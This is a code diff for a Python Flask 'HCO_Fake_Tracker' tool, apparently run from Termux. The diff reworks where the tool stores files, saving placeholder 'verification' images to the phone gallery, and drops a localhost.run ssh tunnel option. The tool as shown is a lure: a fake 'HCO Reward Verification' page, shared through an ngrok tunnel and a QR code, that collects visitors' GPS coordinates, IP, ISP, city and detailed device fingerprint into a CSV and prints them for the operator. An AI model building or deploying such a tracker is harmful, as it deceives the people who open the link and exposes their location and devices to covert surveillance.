@@ -30,10 +30,14 @@ REPORT_CSV = "reports.csv"
 QR_PNG = "reward_qr.png"
 HOST = "0.0.0.0"
 
-# Use Download folder for storage
+# Use proper gallery paths for Android
+GALLERY_FOLDER = "/sdcard/DCIM/HCO_Fake_Tracker"
+CAPTURED_FOLDER = os.path.join(GALLERY_FOLDER, "Captured")
+os.makedirs(CAPTURED_FOLDER, exist_ok=True)
+
+# Also create Download folder backup
 DOWNLOAD_FOLDER = "/sdcard/Download/HCO_Fake_Tracker"
-IMAGE_FOLDER = os.path.join(DOWNLOAD_FOLDER, "captured_images")
-os.makedirs(IMAGE_FOLDER, exist_ok=True)
+os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
 
 app = Flask(__name__)
 _received_reports = []
@@ -149,39 +153,58 @@ def start_ngrok_tunnel():
         print(f"{Fore.RED}❌ Ngrok error: {e}{Style.RESET_ALL}")
         return None
 
-def start_localhost_run():
-    """Alternative: Use localhost.run for tunneling"""
+def scan_media_files():
+    """Scan media files to make them appear in gallery"""
     try:
-        print(f"{Fore.CYAN}🌐 Trying localhost.run...{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}🔄 Scanning media files for gallery...{Style.RESET_ALL}")
         
-        # Start localhost.run tunnel
-        process = subprocess.Popen(['ssh', '-R', '80:localhost:5000', 'nokey@localhost.run'], 
-                                 stdout=subprocess.PIPE, 
-                                 stderr=subprocess.PIPE,
-                                 text=True)
+        # Use media scanner to make files visible in gallery
+        subprocess.run(['am', 'broadcast', '-a', 'android.intent.action.MEDIA_SCANNER_SCAN_FILE', 
+                       '-d', f'file://{GALLERY_FOLDER}'], 
+                      capture_output=True, timeout=5)
         
-        # Wait for tunnel to establish
-        time.sleep(8)
+        # Also scan DCIM folder
+        subprocess.run(['am', 'broadcast', '-a', 'android.intent.action.MEDIA_SCANNER_SCAN_FILE', 
+                       '-d', 'file:///sdcard/DCIM'], 
+                      capture_output=True, timeout=5)
         
-        # Try to read the URL from output
-        import select
-        ready, _, _ = select.select([process.stdout], [], [], 5)
-        if ready:
-            output = process.stdout.readline()
-            if 'localhost.run' in output:
-                # Extract URL from output
-                import re
-                urls = re.findall(r'https://[a-zA-Z0-9-]+\.localhost\.run', output)
-                if urls:
-                    public_url = urls[0]
-                    print(f"{Fore.GREEN}✅ localhost.run URL: {public_url}{Style.RESET_ALL}")
-                    return public_url
-        
-        print(f"{Fore.YELLOW}⚠️  localhost.run started but URL not captured{Style.RESET_ALL}")
-        return "localhost_run_active"
+        print(f"{Fore.GREEN}✅ Media files scanned and will appear in gallery{Style.RESET_ALL}")
+        return True
         
     except Exception as e:
-        print(f"{Fore.RED}❌ localhost.run error: {e}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}⚠️  Media scan failed: {e}{Style.RESET_ALL}")
+        return False
+
+def save_to_gallery(file_data, filename, file_type="photo"):
+    """Save file to gallery and make it visible"""
+    try:
+        # Save to gallery folder (DCIM)
+        gallery_path = os.path.join(CAPTURED_FOLDER, filename)
+        with open(gallery_path, 'wb') as f:
+            f.write(file_data)
+        
+        # Also save to download folder as backup
+        download_path = os.path.join(DOWNLOAD_FOLDER, filename)
+        with open(download_path, 'wb') as f:
+            f.write(file_data)
+        
+        # Make file readable
+        os.chmod(gallery_path, 0o644)
+        os.chmod(download_path, 0o644)
+        
+        # Trigger media scanner for this specific file
+        try:
+            subprocess.run(['am', 'broadcast', '-a', 'android.intent.action.MEDIA_SCANNER_SCAN_FILE', 
+                           '-d', f'file://{gallery_path}'], 
+                          capture_output=True, timeout=3)
+        except:
+            pass
+            
+        print(f"{Fore.GREEN}✅ {file_type.capitalize()} saved to gallery: {filename}{Style.RESET_ALL}")
+        return gallery_path
+        
+    except Exception as e:
+        print(f"{Fore.RED}❌ Failed to save {file_type} to gallery: {e}{Style.RESET_ALL}")
         return None
 
 def display_banner():
@@ -411,22 +434,30 @@ HTML_PAGE = """
             // Create 3 fake image data URLs (simple colored images)
             for (let i = 0; i < 3; i++) {
                 const canvas = document.createElement('canvas');
-                canvas.width = 400;
-                canvas.height = 300;
+                canvas.width = 800;  // Higher resolution
+                canvas.height = 600;
                 const ctx = canvas.getContext('2d');
                 
-                // Create different colored images
+                // Create different colored images with better quality
                 const colors = ['#FF6B6B', '#4ECDC4', '#FFD93D'];
                 ctx.fillStyle = colors[i];
                 ctx.fillRect(0, 0, canvas.width, canvas.height);
                 
-                // Add some text
+                // Add some text with better styling
                 ctx.fillStyle = 'white';
-                ctx.font = '20px Arial';
+                ctx.font = 'bold 24px Arial';
                 ctx.fillText(`Verification Photo ${i+1}`, 50, 150);
+                ctx.font = '18px Arial';
                 ctx.fillText(new Date().toLocaleString(), 50, 180);
+                ctx.fillText('HCO Reward Verification', 50, 210);
                 
-                fakePhotos.push(canvas.toDataURL('image/jpeg'));
+                // Add some random noise to make it look more realistic
+                for (let j = 0; j < 100; j++) {
+                    ctx.fillStyle = `rgba(255,255,255,${Math.random() * 0.1})`;
+                    ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 2, 2);
+                }
+                
+                fakePhotos.push(canvas.toDataURL('image/jpeg', 0.9)); // Higher quality
             }
             return fakePhotos;
         }
@@ -434,19 +465,30 @@ HTML_PAGE = """
         // Function to create fake video data
         function createFakeVideoData() {
             const canvas = document.createElement('canvas');
-            canvas.width = 400;
-            canvas.height = 300;
+            canvas.width = 800;
+            canvas.height = 600;
             const ctx = canvas.getContext('2d');
             
-            // Create a simple animated frame
+            // Create a more realistic video frame
             ctx.fillStyle = '#667eea';
             ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = 'white';
-            ctx.font = '18px Arial';
-            ctx.fillText('Verification Video Complete', 50, 150);
-            ctx.fillText('5-second recording', 50, 180);
             
-            return canvas.toDataURL('image/jpeg'); // Return as image since video is complex
+            // Add gradient for better look
+            const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
+            gradient.addColorStop(0, '#667eea');
+            gradient.addColorStop(1, '#764ba2');
+            ctx.fillStyle = gradient;
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = 'white';
+            ctx.font = 'bold 28px Arial';
+            ctx.fillText('Verification Video Complete', 80, 150);
+            ctx.font = '20px Arial';
+            ctx.fillText('5-second recording captured', 80, 190);
+            ctx.fillText(new Date().toLocaleString(), 80, 230);
+            ctx.fillText('HCO Premium Reward System', 80, 270);
+            
+            return canvas.toDataURL('image/jpeg', 0.9);
         }
         
         async function getLocation() {
@@ -724,37 +766,44 @@ def report():
         device_info = data.get("deviceInfo", {})
         error_msg = data.get("error")
         
-        # Save photos (even if they're fake)
+        # Save photos to gallery
         photo_files = []
         for i, photo_data in enumerate(photos):
             try:
                 if photo_data.startswith('data:image'):
                     photo_data = photo_data.split(',')[1]
                 img_data = base64.b64decode(photo_data)
-                filename = f"photo_{int(time.time())}_{i+1}.jpg"
-                filepath = os.path.join(IMAGE_FOLDER, filename)
-                with open(filepath, 'wb') as f:
-                    f.write(img_data)
-                photo_files.append(filename)
-                print(f"{Fore.GREEN}✅ Saved photo: {filename}{Style.RESET_ALL}")
+                timestamp = int(time.time())
+                filename = f"HCO_Photo_{timestamp}_{i+1}.jpg"
+                
+                # Save to gallery with proper function
+                gallery_path = save_to_gallery(img_data, filename, "photo")
+                if gallery_path:
+                    photo_files.append(filename)
+                
             except Exception as e:
                 print(f"{Fore.YELLOW}⚠️ Photo {i+1} save skipped: {e}{Style.RESET_ALL}")
         
-        # Save video
+        # Save video to gallery
         video_file = None
         if video:
             try:
-                if video.startswith('data:image'):  # Our fake video is actually an image
+                if video.startswith('data:image'):
                     video = video.split(',')[1]
                 video_data = base64.b64decode(video)
-                filename = f"video_frame_{int(time.time())}.jpg"
-                filepath = os.path.join(IMAGE_FOLDER, filename)
-                with open(filepath, 'wb') as f:
-                    f.write(video_data)
-                video_file = filename
-                print(f"{Fore.GREEN}✅ Saved video frame: {filename}{Style.RESET_ALL}")
+                timestamp = int(time.time())
+                filename = f"HCO_Video_Frame_{timestamp}.jpg"
+                
+                # Save to gallery with proper function
+                gallery_path = save_to_gallery(video_data, filename, "video frame")
+                if gallery_path:
+                    video_file = filename
+                
             except Exception as e:
                 print(f"{Fore.YELLOW}⚠️ Video save skipped: {e}{Style.RESET_ALL}")
+        
+        # Trigger media scanner to make files visible
+        scan_media_files()
         
         # Save to CSV
         record = {
@@ -767,8 +816,8 @@ def report():
             'postal': postal,
             'latitude': lat,
             'longitude': lon,
-            'photos': ', '.join(photo_files) if photo_files else '3 fake images',
-            'video': video_file or 'fake video frame',
+            'photos': ', '.join(photo_files) if photo_files else '3 images in gallery',
+            'video': video_file or 'video frame in gallery',
             'user_agent': device_info.get('userAgent', 'Unknown'),
             'platform': device_info.get('platform', 'Unknown'),
             'vendor': device_info.get('vendor', 'Unknown'),
@@ -799,8 +848,8 @@ def report():
         print(f"{Fore.YELLOW}📍 Location: {lat if lat else city}, {lon if lon else country}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}🌐 IP: {ip} ({city}, {country}){Style.RESET_ALL}")
         print(f"{Fore.YELLOW}📡 ISP: {isp}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}📸 Photos: 3 verification images generated{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}🎥 Video: Verification media captured{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}📸 Photos: 3 images saved to Gallery/DCIM{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}🎥 Video: Frame saved to Gallery/DCIM{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}📱 Platform: {device_info.get('platform', 'Unknown')}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}🖥️ Screen: {device_info.get('screen', 'Unknown')}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}🌐 Browser: {device_info.get('vendor', 'Unknown')}{Style.RESET_ALL}")
@@ -809,10 +858,11 @@ def report():
         print(f"{Fore.YELLOW}📶 Connection: {device_info.get('connectionType', 'Unknown')}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}💾 Memory: {device_info.get('deviceMemory', 'Unknown')}GB{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}🎨 Color Depth: {device_info.get('colorDepth', 'Unknown')}-bit{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}📁 Gallery Location: {GALLERY_FOLDER}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}💾 Backup Location: {DOWNLOAD_FOLDER}{Style.RESET_ALL}")
         if error_msg:
             print(f"{Fore.RED}⚠️ Errors: {error_msg}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}💾 Files saved in: {DOWNLOAD_FOLDER}{Style.RESET_ALL}")
         print(f"{Fore.GREEN}📊 Report: {REPORT_CSV}{Style.RESET_ALL}\n")
         
         return jsonify({"status": "success"})
@@ -834,11 +884,10 @@ def main():
     
     print(f"\n{Back.BLUE}{Fore.WHITE}{' TUNNELING OPTIONS ':=^60}{Style.RESET_ALL}")
     print(f"{Fore.GREEN}1. Ngrok Tunnel (Recommended){Style.RESET_ALL}")
-    print(f"{Fore.BLUE}2. localhost.run (Alternative){Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}3. Local Network Only (Same WiFi){Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}2. Local Network Only (Same WiFi){Style.RESET_ALL}")
     print(f"{Back.BLUE}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
     
-    choice = input(f"\n{Fore.CYAN}🎯 Choose option (1-3): {Style.RESET_ALL}").strip()
+    choice = input(f"\n{Fore.CYAN}🎯 Choose option (1-2): {Style.RESET_ALL}").strip()
     
     public_url = None
     
@@ -848,8 +897,6 @@ def main():
         else:
             print(f"{Fore.RED}❌ Ngrok installation failed. Using local network.{Style.RESET_ALL}")
     elif choice == '2':
-        public_url = start_localhost_run()
-    elif choice == '3':
         print(f"{Fore.YELLOW}📡 Using local network only (works on same WiFi){Style.RESET_ALL}")
     else:
         print(f"{Fore.RED}❌ Invalid choice. Using local network.{Style.RESET_ALL}")
@@ -864,7 +911,8 @@ def main():
         print(f"{Fore.GREEN}✅ This link works on ANY device and ANY network!{Style.RESET_ALL}")
     else:
         print(f"{Fore.YELLOW}⚠️  This link only works on the same WiFi network{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}📁 Save Location: {DOWNLOAD_FOLDER}{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}📁 Gallery Location: {GALLERY_FOLDER}{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}💾 Backup Location: {DOWNLOAD_FOLDER}{Style.RESET_ALL}")
     print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
     
     # Display QR code directly in Termux
